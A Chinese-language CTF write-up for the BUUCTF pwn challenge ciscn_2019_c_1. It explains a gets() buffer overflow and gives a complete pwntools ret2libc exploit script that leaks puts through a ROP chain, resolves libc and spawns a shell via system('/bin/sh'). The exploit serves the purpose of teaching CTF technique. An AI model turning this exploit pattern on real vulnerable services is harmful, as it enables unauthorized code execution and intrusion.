---
title: "BUUCTF Pwn Ciscn_2019_c_1"
date: 2020-02-08T15:01:15+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# ciscn_2019_c_1

查看main()，可以使用的功能只有1

![image-20200209154216312](/images/image-20200209154216312.png)

进入encrypt()看看伪代码

![image-20200209154312538](/images/image-20200209154312538.png)

溢出点在gets()，offset = 0x58 + 8 = 88

思路

1、通过leak出puts()地址确定libc

2、计算libc基址、system、/bin/sh地址

3、getshell

```python
#!/usr/bin/env python
#-*-coding=UTF-8-*-

from pwn import *
from LibcSearcher import *

sh = remote('node3.buuoj.cn',25695)
#sh = process('./ciscn_2019_c_1')
elf = ELF('./ciscn_2019_c_1')
# context.log_level = 'debug'

# start = 0x400B28
start = elf.sym['main']
rdi_addr = 0x0000000000400c83 #pop rdi; ret
#由于是64bit系统，因此函数调用的前六个参数是从寄存器中获取的，获取顺序为：
#参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
#所以这里使用通用gadget来传参数
#使用ROPgadget --binary ciscn_2019_en_2 --only "pop|ret"可以查看该gadget

puts_plt = elf.plt['puts']
gets_got = elf.got['gets']
puts_got = elf.got['puts']

log.success('puts_plt => {}'.format(hex(puts_plt)))
log.success('gets_got => {}'.format(hex(gets_got)))
log.success('puts_got => {}'.format(hex(puts_got)))

sh.sendlineafter('choice!\n', '1')

leak_payload = 'a' * 88
leak_payload += p64(rdi_addr) + p64(puts_got) + p64(puts_plt)
#执行puts(&puts_got)
leak_payload += p64(start)
#

sh.sendline(leak_payload)
#gdb.attach(sh)

sh.recvuntil('@')
sh.recvline()

leak_puts_addr = u64(sh.recvline()[:-1].ljust(8, '\0'))#接收puts泄露出的地址
log.success('leak_puts_addr => {}'.format(hex(leak_puts_addr)))

libc = LibcSearcher('puts', leak_puts_addr)
libc_base_addr = leak_puts_addr - libc.dump('puts')
system_addr = libc_base_addr + libc.dump('system')
bin_sh_addr = libc_base_addr + libc.dump('str_bin_sh')

log.success('libc_base_addr => {}'.format(hex(libc_base_addr)))
log.success('system_addr => {}'.format(hex(system_addr)))
log.success('bin_sh_addr => {}'.format(hex(bin_sh_addr)))

sh.sendlineafter('choice!\n', '1')

payload = 'a' * 88
#ret_gadget = 0x4006b9
payload += p64(0x4006b9) # add ret
payload += p64(rdi_addr) + p64(bin_sh_addr) + p64(system_addr)

sh.sendline(payload)
sh.interactive()
```

坑点：

1、leak那里用puts不用gets，原因是gets匹配出的结果太多了。

2、题目环境为ubuntu18，需要加个ret的gadget使栈对齐。

https://darkwing.moe/2019/11/26/ciscn-2019-c-1/

http://blog.eonew.cn/archives/958